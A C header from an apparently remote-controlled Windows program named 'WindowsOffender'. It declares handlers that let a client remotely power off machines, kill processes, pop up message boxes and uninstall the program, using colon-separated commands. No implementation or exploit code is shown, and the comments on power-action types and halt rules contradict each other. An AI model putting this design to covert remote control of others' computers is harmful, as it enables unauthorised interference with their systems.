#pragma once

// RequestActionHandlers.h

/*
Contains the functions responsible for handling the recieved request from the client 

All RequestAction (Ra) functions have the signature Ra<Name>(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters); 
pActionFunctionParameters->argumentCount is automatically determined.
The Arguments array's first element contains the request's id, so the actual arguments start at Arguments[1]
The client passes arguments to the server by putting strings seperated by colons (:) after the request id 
for example: RaTerminateProcess has the following Signature:
    - Arguments[1]: PID of process to be terminated
that means if the client requests to terminate a process with the PID 284 it will send this to the server: terminateprocess:284

if we have multiple arguments like in RaPowerControl:

    - Arguments[1]: type (firmware|syscall|normal).
    - Arguments[2]: Power action (poweroff|reboot|halt) (halt cannot be used with type normal).

then the client would send powercontrol:firmware:poweroff if it wants to request a firmware power down, or powercontrol:normal:reboot 
if it wants to request a normal reboot.

a request from the client may not end with a colon like terminateprocess:1024: in case it does, it will return SERVER_STATUS_INVALID_REQUEST_SYNTAX.
*/



/*
@brief frees argumentCount arguments of the arguments string array.

@param arguments the string array to free the elements of.
@param argumentCount the amount of arguments in the array to free.

@return Nothing.
*/
void RaFreeThreadedActionParameters(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);

/*
Arguments[1]: type of power action (firmware|native|normal).
Arguments[2]: Power action (poweroff|reboot|halt) (halt can only be used with type firmware).
*/
SERVER_STATUS_CODE RaPowerControl(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);

// Arguments[1]: PID of process to be terminated.
SERVER_STATUS_CODE RaTerminateProcess(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);

/*
Arguments[1]: Message box text.
Arguments[2]: Message box title.
Arguments[3]: Icon/Control-button bitmask.
*/
SERVER_STATUS_CODE RaThreadedMessageBox(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);

/*
Uninstalls WindowsOffender, all remote functionality will remain until the next reboot.

No arguments.
*/
SERVER_STATUS_CODE RaSelfDestroy(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);

/*
Ping!

No arguments.
*/
SERVER_STATUS_CODE RaPing(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);


#ifdef DEBUG
// For debugging purposes
SERVER_STATUS_CODE RaDebugTest(PACTION_FUNCTION_PARAMETERS pActionFunctionParameters);
#endif